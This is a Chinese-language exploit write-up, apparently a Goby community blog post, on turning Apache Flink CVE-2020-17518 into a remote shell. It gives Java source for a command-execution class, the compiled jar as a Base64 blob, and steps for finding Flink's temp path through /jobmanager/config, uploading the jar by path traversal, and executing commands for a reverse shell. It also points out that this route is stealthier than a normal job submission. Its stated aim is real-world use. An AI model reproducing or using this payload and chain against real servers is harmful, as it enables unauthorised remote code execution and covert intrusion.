![](https://image.3001.net/images/20210108/1610088825_5ff80179ddd5493c5da60.png!small)

**前言：** 最近网上爆出Apache
Flink漏洞CVE-2020-17518，影响范围从1.5.1到1.11.2，漏洞版本周期超过两年，看了一些网上的漏洞复现文章里提到的EXP主要只停留在写文件后登录服务器里验证。为了在实战中能够发挥作用，于是想尝试构造能够Getshell的EXP。

## 0x001 分析与利用过程

###  **1.1 环境搭建**

使用Vulfocus、Vulhub可一键搭建CVE-2020-17518漏洞环境。

>
> <https://github.com/fofapro/vulfocus><https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518>

###  **1.2 失败的经历**

由于可以目录穿越上传，首先就考虑上传jsp一句话到Web目录，但是Web目录下并不能够解析jsp脚本，jsp文件会被直接下载回来。![](https://image.3001.net/images/20210108/1610088910_5ff801cec0d94e3a5079c.png!small)

###  **1.3 更换思路，获取shell**

考虑结合先前Flink 1.9.x爆出的部署jar包getshell的思路进行突破。

 **1.3.1 准备jar包**

主要源码如下，用于执行系统命令。

    
    
    import java.io.File;
    import java.util.Scanner;
    
    public class Execute {
        public Execute() {
        }
    
        public static void main(String[] args) throws Exception {
            String o = "";
            String cmd = args[0];
            ProcessBuilder p;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
            } else {
                String pty = "/bin/sh";
                if ((new File("/bin/bash")).exists()) {
                    pty = "/bin/bash";
                }
                p = new ProcessBuilder(new String[]{pty, "-c", cmd});
            }
    
            Process s = p.start();
            Scanner c = (new Scanner(s.getInputStream())).useDelimiter("\\A");
            c.close();
        }
    }

将源码编译并打包为jar包，下面为打包好的jar包转码为Base64编码。

    
    
    UEsDBBQAAAAIAASBJlLHe4y+9gIAAOgEAAANAAAARXhlY3V0ZS5jbGFzc21Uy1bUQBC9zTwSQnhFBEZ8gAoOCIwiKgKivEWGhwbRATaZ0AcCMwkmPQIbN/oTfIFrNoNHjn6Av+MatToqLycn6UpX3Vt1q7uT7z+/fAPQixUNTehQcVtFp4YudGsoR0rFHWnvKuhRcE9Fr4r7GlQ8UPFQQZ+KRxqq0C+HARWDMvRYwZCGJ3iqoQ7DKkakHZXDmIJxBRMM8UHHdcQQQyTZvsgQHfVWOUN12nH5bCGf5f6Clc1xCuQtx2WoTy6nN6x3VipnuWspU/iOuzYgiZWmsOzNGWsrxJNABZOklEEb37H5lnA8N1DwjOamV/BtPuHIrPr4DrcLgnfLnDou4woDGBQv6HatPKWZ0vEc0zrSmCGJ246rYxZzDI0nIuZ9z+ZBMFJwcqvcZ6g5r4/y2fnVbr5DBctStizTQr5U1nFTwTqJCAmOl/qjqTwMZK1gXSLndbzASyJ2EdHEAkNtCC8IJ5cybct1ua/glY5FvJb4NwRdGdaRwZKOZdmP8rfHM8rmshvcFgwXSiwneU98x6t3trHdQPA8Q8UaF9T/FvfFLkNbssTelMpfIby0t839USsgWXXJkiDV9lxBmx4wNJ1OPLpu+SZ/W+CuzQfalxguJksfiTjfcQIRyKMlYbFAWL4g+Em5k92jerXnncSsov6m3K2CoLTcooYbiPxvu04FiN6YLBUIheiFgI/xnJN3hDwgt0ou03+7Sjljds4LOFpwiT5IeZWByUNK41WatZBlZGMdB2D7kCf3Go0awciJKOL0vTYTrCyE/6B5nOxHoyzdEemZMSKfES0iZsSLUPbQfAg1E/+K8kzE0MxM1KgwM7FO8wD67Cf0GpX90UNUZYzqA9QUUbsHxagm1zEnEZUc45jTVcQFGa/LJKjIxQPUGw1FNPbHErEiEvuymVBtD3QayxEh3Qq9N6CSfkHV6EMNJlGLafpbcPJuohHvkcAHWozrxGhF5Ai9Cm7QfYR6kPlF4aiCm/Qa3q0Ea6MnClp0epJh0fbfUEsDBAoAAAgAACJ1bU8AAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAQI/ABQAAAAIAASBJlLHe4y+9gIAAOgEAAANACQAAAAAAAAAIAAAAAAAAABFeGVjdXRlLmNsYXNzCgAgAAAAAAABABgAsQeXEAPk1gFyshItA+TWAdyLEi0D5NYBUEsBAgoACgAACAAAInVtTwAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAIQMAAE1FVEEtSU5GL1BLAQIUABQACAgIACJ1bU+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAEgDAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwUGAAAAAAMAAwDcAAAAvgMAAAAA

 **1.3.2 获取Flink运行目录**

Flink运行时文件都在/tmp目录下，路径类似于

    
    
    /tmp/flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/

每台服务器运行Flink时路径都不同，因此要先获取该路径。

通过接口 /jobmanager/config 则可以获取web.tmpdir的路径。

![](https://image.3001.net/images/20210108/1610089048_5ff80258b2b0ea2dc9d6d.png!small)

 **1.3.3 上传jar包**

通过拼接路径，结合CVE-2020-17518漏洞即可上传jar包到/tmp/flink-web-f4aee131-987b-46d7-91af-754464a230b2/flink-web-upload/目录下。

![](https://image.3001.net/images/20210108/1610089066_5ff8026a528053016867e.png!small)

 **1.3.4 执行命令，反弹shell**

![](https://image.3001.net/images/20210108/1610089086_5ff8027e41b7d4e64e1c9.png!small)![](https://image.3001.net/images/20210108/1610089098_5ff8028a0d22b82c7f7d7.png!small)

###  **1.4 Jar包上传方式对比**

相比通过"Submit New
Job"处上传jar包，通过利用CVE-2020-17518漏洞上传的jar包，并不会在前台显示，因此具有一定的隐蔽性。![](https://image.3001.net/images/20210108/1610089125_5ff802a550fd9f727378a.png!small)

## 0x002 使用Goby一键Getshell

Goby超级内测版本 Beta 1.8.236 已支持利用该漏洞。

![](https://image.3001.net/images/20210108/1610089174_5ff802d6a9e59d74c0381.gif!small)

文章来自Goby社区成员：f1tz，转载请注明出处。

下载Goby内测版，请关注公众号：Gobysec

下载Goby正式版，请访问官网：[http://gobies.org](http://gobies.org/)

